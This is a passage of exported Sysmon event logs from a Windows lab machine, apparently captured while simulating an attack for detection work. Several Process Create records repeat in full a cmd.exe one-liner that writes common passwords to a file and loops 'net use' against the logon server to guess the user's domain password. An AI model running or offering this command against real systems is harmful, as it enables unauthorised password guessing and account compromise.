      <Data Name=""ParentCommandLine"">""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:08.633

ProcessGuid: {f57bd86a-8e00-658c-c701-000000000f00}

ProcessId: 3520

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""1q2w3e4r ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19575,,,C:\Windows\system32\net.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:05.623

ProcessGuid: {f57bd86a-8df8-658c-c601-000000000f00}

ProcessId: 6380

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8df8-658c-c601-000000000f00},3588,6380,,windev2309eval,fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;,0,"
      ",-,2023-12-27T20:50:01.7323056Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:05.623,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:01.7323056Z""/>
      <EventRecordID>19575</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:05.623</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8df8-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">6380</Data>
      <Data Name=""QueryName"">windev2309eval</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;</Data>
      <Data Name=""Image"">C:\Windows\system32\net.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:05.623

ProcessGuid: {f57bd86a-8df8-658c-c601-000000000f00}

ProcessId: 6380

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19574,,,C:\Windows\System32\svchost.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:05.555

ProcessGuid: {f57bd86a-36f7-658c-2a00-000000000f00}

ProcessId: 1956

QueryName: WINDEV2309EVAL

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\System32\svchost.exe

User: NT AUTHORITY\NETWORK SERVICE",Info,,,,,,,{f57bd86a-36f7-658c-2a00-000000000f00},3588,1956,,WINDEV2309EVAL,fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;,0,"
      ",-,2023-12-27T20:50:01.7273041Z,,Dns query (rule: DnsQuery),,5164,NT AUTHORITY\NETWORK SERVICE,S-1-5-18,2023-12-27 14:52:05.555,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:01.7273041Z""/>
      <EventRecordID>19574</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:05.555</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-36f7-658c-2a00-000000000f00}</Data>
      <Data Name=""ProcessId"">1956</Data>
      <Data Name=""QueryName"">WINDEV2309EVAL</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""User"">NT AUTHORITY\NETWORK SERVICE</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:05.555

ProcessGuid: {f57bd86a-36f7-658c-2a00-000000000f00}

ProcessId: 1956

QueryName: WINDEV2309EVAL

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\System32\svchost.exe

User: NT AUTHORITY\NETWORK SERVICE</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Password1 ""  ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Net Command,1,19573,10.0.22621.1 (WinBuild.160101.0800),"MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3",C:\Windows\System32\net.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:00.382

ProcessGuid: {f57bd86a-8df8-658c-c601-000000000f00}

ProcessId: 6380

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Password1 ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL

ParentUser: WINDEV2309EVAL\User",Info,net.exe,"""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL",C:\Windows\System32\cmd.exe,{f57bd86a-8df8-658c-c401-000000000f00},3460,WINDEV2309EVAL\User,{f57bd86a-8df8-658c-c601-000000000f00},3588,6380,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:00.3850238Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:00.382,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:00.3850238Z""/>
      <EventRecordID>19573</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:00.382</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8df8-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">6380</Data>
      <Data Name=""Image"">C:\Windows\System32\net.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Net Command</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">net.exe</Data>
      <Data Name=""CommandLine"">net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Password1 ""  </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8df8-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">3460</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:00.382

ProcessGuid: {f57bd86a-8df8-658c-c601-000000000f00}

ProcessId: 6380

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Password1 ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %%p in (passwords.txt) DO @net use %%logonserver%%\IPC$ /user:""%%userdomain%%\%%username%%"" ""%%p"" 1>NUL 2>&1 && @echo [*] %%username%%:%%p && @net use /delete %%logonserver%%\IPC$ > NUL",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19572,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:00.348

ProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ProcessId: 3460

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %%p in (passwords.txt) DO @net use %%logonserver%%\IPC$ /user:""%%userdomain%%\%%username%%"" ""%%p"" 1>NUL 2>&1 && @echo [*] %%username%%:%%p && @net use /delete %%logonserver%%\IPC$ > NUL

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8df8-658c-c401-000000000f00},3588,3460,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:00.3498519Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:00.348,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:00.3498519Z""/>
      <EventRecordID>19572</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:00.348</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8df8-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">3460</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %%p in (passwords.txt) DO @net use %%logonserver%%\IPC$ /user:""%%userdomain%%\%%username%%"" ""%%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %%username%%:%%p &amp;&amp; @net use /delete %%logonserver%%\IPC$ &gt; NUL</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:00.348

ProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ProcessId: 3460

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %%p in (passwords.txt) DO @net use %%logonserver%%\IPC$ /user:""%%userdomain%%\%%username%%"" ""%%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %%username%%:%%p &amp;&amp; @net use /delete %%logonserver%%\IPC$ &gt; NUL

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
